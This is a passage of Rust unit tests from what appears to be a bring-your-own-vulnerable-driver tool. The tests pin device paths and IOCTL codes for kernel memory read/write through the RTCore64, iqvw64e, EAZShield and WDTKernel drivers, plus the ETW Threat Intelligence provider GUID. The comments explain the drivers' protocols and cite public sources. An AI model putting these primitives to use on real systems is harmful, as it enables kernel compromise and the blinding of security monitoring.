        // (A prior version had these swapped, so every read silently failed.)
        let d = RtCore64;
        assert_eq!(d.read_ioctl(), 0x80002048);
        assert_eq!(d.write_ioctl(), 0x8000204C);
        // \\.\RTCore64 — two leading backslashes (Win32 device namespace).
        let expected: &[u16] = &[
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'R' as u16,
            'T' as u16,
            'C' as u16,
            'o' as u16,
            'r' as u16,
            'e' as u16,
            '6' as u16,
            '4' as u16,
        ];
        assert_eq!(d.device_path(), expected);
    }

    #[test]
    fn iqvw64e_uses_single_dispatch_ioctl_not_two_rtcodes() {
        // iqvw64e's protocol is fundamentally different from RTCore64: a SINGLE
        // dispatch IOCTL 0x80862007 handles every operation (the case_number
        // field selects it), and case 0x33 drives an arbitrary-length
        // kernel-side memcpy. Verified against TheCruZ/kdmapper intel_driver.cpp.
        // A prior version wrongly asserted 0x80802010/0x80802014 (RTCore64-shaped
        // guess) — those codes don't exist on this driver, so every R/W silently
        // failed. Pin the real codes.
        let d = Iqvw64e;
        assert_eq!(d.read_ioctl(), 0x80862007);
        assert_eq!(d.write_ioctl(), 0x80862007);
        // \\.\iqvw64e
        let expected: &[u16] = &[
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'i' as u16, 'q' as u16, 'v' as u16, 'w' as u16,
            '6' as u16, '4' as u16, 'e' as u16,
        ];
        assert_eq!(d.device_path(), expected);
    }

    #[test]
    fn shield_uses_single_bidirectional_ioctl() {
        // Shield (EAZShield) uses ONE bidirectional IOCTL 0x96102014 for both
        // read and write — a direction byte in the request selects which.
        // Verified against magicsword-io/LOLDrivers issue #344.
        let d = crate::byovd_drivers::shield::Shield;
        assert_eq!(d.read_ioctl(), 0x96102014);
        assert_eq!(d.write_ioctl(), 0x96102014);
        // \\.\EAZShield
        let expected: &[u16] = &[
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'E' as u16, 'A' as u16, 'Z' as u16, 'S' as u16,
            'h' as u16, 'i' as u16, 'e' as u16, 'l' as u16,
            'd' as u16,
        ];
        assert_eq!(d.device_path(), expected);
    }

    #[test]
    fn wdtkernel_device_path_and_ioctl_codes_match_loldrivers_290() {
        // WDTKernel's real device is \\.\__WDT__ (NOT \\.\WatchdogTimer — that
        // path does not exist and would fail CreateFileW). Its R/W primitive is
        // PHYSICAL-only (MmMapIoSpace); the codes are the 0x9C4124xx family
        // (verified against LOLDrivers #290), not the fabricated 0x9C402580/
        // 0x9C402584 a prior version carried.
        let d = crate::byovd_drivers::wdtkernel::WdtKernel;
        assert_eq!(d.read_ioctl(), 0x9C412420); // bulk read BYTE
        assert_eq!(d.write_ioctl(), 0x9C41242C); // bulk write BYTE
        // \\.\__WDT__
        let expected: &[u16] = &[
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            '_' as u16, '_' as u16, 'W' as u16, 'D' as u16,
            'T' as u16, '_' as u16, '_' as u16,
        ];
        assert_eq!(d.device_path(), expected);
    }

    #[test]
    fn default_driver_factory_returns_one_of_the_known_drivers() {
        // The public selection API (NYX_BYOVD build config) must return a
        // driver whose device path matches one of the four known impls. We
        // don't pin the exact default (it depends on the build-time env var,
        // which CI may set) — just that the factory yields a recognized driver.
        let d = default_driver();
        let path = d.device_path();
        let known = [
            RtCore64.device_path(),
            Iqvw64e.device_path(),
            crate::byovd_drivers::shield::Shield.device_path(),
            crate::byovd_drivers::wdtkernel::WdtKernel.device_path(),
        ];
        assert!(
            known.iter().any(|k| *k == path),
            "default_driver() returned an unknown device path"
        );
    }

    #[test]
    fn iqvw64e_raw_rw_overrides_rtc64_byte_loop() {
        // Iqvw64e MUST override the default raw_rw (its protocol is a single
        // memcpy IOCTL, not RTCore64's per-byte loop). We can't exercise the
        // real DeviceIoControl without a kernel, but the smoking gun that the
        // override is the iqvw64e one (not the inherited RTCore64 default) is
        // that read and write share ONE dispatch IOCTL — the default impl reads
        // read_ioctl()/write_ioctl() as DISTINCT codes (0x80002048 != 0x8000204C
        // for RTCore64). If both are equal, the per-driver override owns the
        // protocol.
        let d = Iqvw64e;
        assert_eq!(d.read_ioctl(), d.write_ioctl(),
            "iqvw64e read+write share one IOCTL (dispatch by case_number)");
        assert_ne!(RtCore64.read_ioctl(), RtCore64.write_ioctl(),
            "sanity: RTCore64 read/write codes ARE distinct (default-impl path)");
    }

    #[test]
    fn etw_ti_guid_is_the_threat_intelligence_provider() {
        // {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
        assert_eq!(
            ETW_TI_GUID_CHECK,
            [
                0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D,
                0xD3, 0x44
            ]
        );
    }

    // Re-declare the GUID constant for the test (the real one is in etwti.rs;
    // here we just pin the expected bytes).
    const ETW_TI_GUID_CHECK: [u8; 16] = [
        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3,
        0x44,
    ];
}
